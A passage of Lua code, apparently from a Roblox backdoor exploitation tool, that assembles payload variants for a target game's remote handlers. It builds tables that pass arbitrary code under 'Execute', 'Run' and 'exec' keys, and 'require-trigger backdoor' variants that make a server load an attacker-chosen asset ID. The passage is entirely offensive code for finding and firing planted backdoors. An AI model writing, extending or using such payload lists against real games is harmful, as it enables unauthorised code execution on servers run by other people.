    table.insert(p, {{Type = "Execute", Payload = code}})
    table.insert(p, {{Type = "Run",     Data    = code}})
    table.insert(p, {{action = "exec",  value   = code}})

    -- Tier 4: Asset ID variants (require-trigger backdoors)
    if extractedID then
        local n = tonumber(extractedID)
        table.insert(p, {n})
        table.insert(p, {"Require",  n})
        table.insert(p, {"require",  n})
        table.insert(p, {"load",     n})
        table.insert(p, {n, "run"})
        table.insert(p, {{ID = n}})
